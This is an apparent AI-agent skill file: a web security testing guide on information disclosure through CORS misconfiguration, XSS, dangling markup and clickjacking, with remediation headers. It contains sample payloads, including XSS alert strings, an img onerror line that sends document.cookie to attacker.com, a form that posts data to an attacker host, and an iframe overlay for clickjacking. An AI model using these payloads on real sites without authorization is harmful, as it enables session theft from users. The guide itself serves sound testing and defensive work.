---
name: web-info-disclosure-testing
description: How to test for and understand sensitive information disclosure vulnerabilities in web applications. Use this skill whenever you need to assess web security, test for information leakage, analyze CORS configurations, check for XSS vulnerabilities, identify clickjacking risks, or evaluate how sensitive data might be exposed through web interfaces. Make sure to use this skill when reviewing web applications for security, conducting penetration testing, analyzing session handling, or investigating potential data exposure issues.
---

# Web Information Disclosure Testing

This skill helps you identify and understand how sensitive information might be disclosed through web applications. It covers the main attack vectors that can lead to information theft when a web page presents sensitive data based on user sessions.

## When to Use This Skill

Use this skill when:
- You need to assess web application security for information disclosure vulnerabilities
- You're conducting penetration testing or security audits
- You want to understand how session-based data might be exposed
- You're reviewing CORS, XSS, or clickjacking protections
- You need to test how sensitive information (cookies, session tokens, personal data) is handled

## Core Concept

When a web page displays sensitive information based on your session (cookies, session tokens, personal data, financial information, etc.), there are several attack vectors that could allow an attacker to steal this information. Understanding these vectors helps you both test for vulnerabilities and implement proper defenses.

## Attack Vectors

### 1. CORS Bypass

**What it is:** Cross-Origin Resource Sharing (CORS) controls which domains can access resources on your server. Misconfigured CORS headers can allow malicious sites to read sensitive data.

**How to test:**

1. **Check current CORS configuration:**
   ```bash
   curl -I -H "Origin: https://malicious-site.com" https://target-site.com/api/endpoint
   ```

2. **Look for dangerous headers:**
   - `Access-Control-Allow-Origin: *` on endpoints that return sensitive data
   - `Access-Control-Allow-Origin: $origin` (reflects any origin)
   - `Access-Control-Allow-Credentials: true` combined with permissive origin policies

3. **Test with different origins:**
   ```bash
   curl -I -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" \
        -H "Access-Control-Request-Headers: Authorization" \
        -X OPTIONS https://target-site.com/api/sensitive
   ```

**What to look for:**
- Endpoints that return sensitive data with overly permissive CORS headers
- Credentials being allowed with wildcard origins
- Origin reflection without proper validation

### 2. Cross-Site Scripting (XSS)

**What it is:** XSS allows attackers to inject malicious scripts that execute in the context of the victim's browser, potentially stealing session cookies and sensitive data.

**How to test:**

1. **Identify input vectors:**
   - URL parameters
   - Form fields
   - HTTP headers (User-Agent, Referer)
   - JSON body parameters
   - File upload names

2. **Test for reflected XSS:**
   ```
   https://target-site.com/page?input=<script>alert(1)</script>
   ```

3. **Test for stored XSS:**
   - Submit payloads through forms
   - Check if they persist and render on subsequent page loads

4. **Test for DOM-based XSS:**
   - Look for JavaScript that uses `document.write()`, `innerHTML`, `eval()`
   - Check URL fragment handling (`#` parameters)

**Common payloads to test:**
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

**What to look for:**
- Unsanitized user input reflected in HTML
- JavaScript that processes user input unsafely
- Missing Content Security Policy (CSP) headers
- CSP headers with `unsafe-inline` or `unsafe-eval`

### 3. Dangling Markup (Scriptless Injection)

**What it is:** When you can't inject script tags, you might still be able to use other HTML elements to exfiltrate data through image requests, form submissions, or other mechanisms.

**How to test:**

1. **Image tag exfiltration:**
   ```html
   <img src="https://attacker.com/steal?data=" onerror="this.src='https://attacker.com/steal?data='+document.cookie">
   ```

2. **Form-based exfiltration:**
   ```html
   <form action="https://attacker.com/collect" method="POST">
     <input type="hidden" name="stolen" value="sensitive-data">
   </form>
   <script>document.forms[0].submit()</script>
   ```

3. **Link-based attacks:**
   ```html
   <a href="https://attacker.com/steal?data=">Click here</a>
   ```

4. **Meta refresh:**
   ```html
   <meta http-equiv="refresh" content="0;url=https://attacker.com/steal?data=">
   ```

**What to look for:**
- HTML injection points that don't allow `<script>` but allow other tags
- Incomplete HTML tags that can be closed and extended
- Context where HTML is rendered without proper escaping

### 4. Clickjacking

**What it is:** Clickjacking tricks users into clicking on something different from what they perceive, potentially causing them to perform actions or reveal sensitive data.

**How to test:**

1. **Check X-Frame-Options header:**
   ```bash
   curl -I https://target-site.com | grep -i x-frame-options
   ```
   - Should be `DENY` or `SAMEORIGIN`
   - `ALLOWALL` or missing is vulnerable

2. **Check Content-Security-Policy frame-ancestors:**
   ```bash
   curl -I https://target-site.com | grep -i content-security-policy
   ```
   - Should include `frame-ancestors 'self'` or `frame-ancestors 'none'`

3. **Test iframe embedding:**
   ```html
   <iframe src="https://target-site.com/sensitive-page" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.1;"></iframe>
   <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     <button style="position:absolute;top:50%;left:50%;">Click here</button>
   </div>
   ```

4. **Test with different framing contexts:**
   - Try embedding in iframes from different domains
   - Test with various CSS positioning techniques
   - Check if sensitive actions can be triggered through overlay

**What to look for:**
- Missing or weak X-Frame-Options headers
- Missing or permissive CSP frame-ancestors
- Sensitive actions that can be triggered without user awareness
- Pages that display sensitive data without frame protection

## Testing Methodology

### Step 1: Reconnaissance

1. **Map the application:**
   - Identify all endpoints that handle sensitive data
   - Document session handling mechanisms
   - Note authentication and authorization flows

2. **Identify sensitive data:**
   - Session cookies and tokens
   - Personal identifiable information (PII)
   - Financial data
   - API keys and credentials
   - Internal system information

### Step 2: Test Each Vector

For each sensitive endpoint or page:

1. **Test CORS:** Check headers and test with different origins
2. **Test XSS:** Try injection at all input points
3. **Test Dangling Markup:** Look for HTML injection opportunities
4. **Test Clickjacking:** Verify frame protection headers

### Step 3: Document Findings

For each vulnerability found:
- Describe the vulnerability type
- Provide reproduction steps
- Include evidence (screenshots, curl commands, payloads)
- Assess impact (what data could be stolen)
- Recommend remediation

## Remediation Guidelines

### CORS Protection

```http
Access-Control-Allow-Origin: https://trusted-domain.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
```

- Never use `*` with `Access-Control-Allow-Credentials: true`
- Validate origins server-side
- Use specific allowed origins, not reflection

### XSS Protection

- Implement proper output encoding for all user input
- Use Content Security Policy headers:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
  ```
- Use HTTPOnly and Secure flags on cookies
- Implement input validation and sanitization

### Dangling Markup Protection

- Use proper HTML escaping in all contexts
- Implement Content Security Policy
- Use frameworks with built-in escaping (React, Vue, etc.)
- Validate and sanitize all user input

### Clickjacking Protection

```http
X-Frame-Options: DENY
# or
X-Frame-Options: SAMEORIGIN
# or
Content-Security-Policy: frame-ancestors 'self'
```

- Set appropriate frame options on all pages
- Use CSP frame-ancestors as additional protection
- Test that pages cannot be embedded in iframes

## Tools and Resources

### Manual Testing Tools
- Browser DevTools (Network tab for CORS, Console for XSS)
- curl for header inspection
- Burp Suite for intercepting and modifying requests
- OWASP ZAP for automated scanning

### Automated Scanners
- OWASP ZAP
- Burp Suite Professional
- Nikto
- W3C Nu Validator (for HTML issues)

### Reference Materials
- OWASP Testing Guide
- OWASP Top 10
- PortSwigger Web Security Academy
- OWASP Cheat Sheet Series

## Important Notes

1. **Authorization:** Only test systems you have explicit permission to test
2. **Scope:** Stay within agreed testing boundaries
3. **Documentation:** Document all findings thoroughly
4. **Responsible Disclosure:** Report vulnerabilities through proper channels
5. **Legal Compliance:** Ensure testing complies with applicable laws and regulations

## Common Mistakes to Avoid

- Testing production systems without authorization
- Not testing all input vectors (headers, cookies, URL fragments)
- Assuming modern frameworks are automatically secure
- Not considering the full request/response cycle
- Missing edge cases in CORS configuration
- Overlooking third-party integrations

## Next Steps

After identifying vulnerabilities:
1. Prioritize based on severity and impact
2. Work with developers to implement fixes
3. Re-test after remediation
4. Update security documentation
5. Consider implementing automated security testing in CI/CD
